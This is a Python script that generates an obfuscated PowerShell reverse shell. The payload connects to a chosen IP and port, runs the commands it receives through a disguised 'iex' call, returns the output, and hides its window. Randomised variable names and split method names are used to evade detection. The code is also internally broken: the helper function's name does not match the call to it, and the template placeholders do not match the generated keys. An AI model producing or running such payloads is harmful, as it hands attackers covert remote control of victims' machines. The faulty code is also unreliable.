import random
import string

def generate_obfuscated_powershell_script(ip_address, port_number):
     # Function to generate random variable names
     def random_variable_name(size=4):
         return ''.join(random.choice(string.ascii_letters) for _ in range(size))

     # PowerShell script template
     template="""
Start-Process $PSHOME\\powershell.exe -ArgumentList {{
     ${tcp_client_var} = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
     ${network_stream_var} = ${tcp_client_var}.$('Get'+'Stream')();
     [byte[]]${byte_array_var} = 0..65535|%{{0}};
     while((${command_var} = ${network_stream_var}.Read(${byte_array_var}, 0, ${byte_array_var}.Length)) -ne 0) {{
         ${output_var} = (New-Object -TypeName System.Text.ASCIIEncoding).$('Get'+'String')(${byte_array_var},0, ${command_var});
         ${encoder_var} = (i''ex ${output_var} 2>&1 | Out-String);
         ${input_var} = ${encoder_var} + 'PS ' + (pwd).Path + '> ';
         ${decoded_input_var} = ([text.encoding]::ASCII).$('Get'+'Bytes')(${input_var});
         ${network_stream_var}.Write(${decoded_input_var},0,${decoded_input_var}.Length);
         ${network_stream_var}.Flush();
     }};
     ${tcp_client_var}.Close();
}} -WindowStyle Hidden
"""

     # Generate random variable names
     variables = {f"var{i}": random_var_name() for i in range(1, 9)}

     # Fill the template with the IP, port and random variable names
     script = template.format(ip=ip, port=port, **variables)
     return script

# Ask the user for the IP and port
ip = input("Enter the IP address: ")
port = input("Enter the port: ")

# Generate and display the obfuscated PowerShell script
ps_script = generate_obfuscated_powershell_script(ip, port)
print(ps_script)
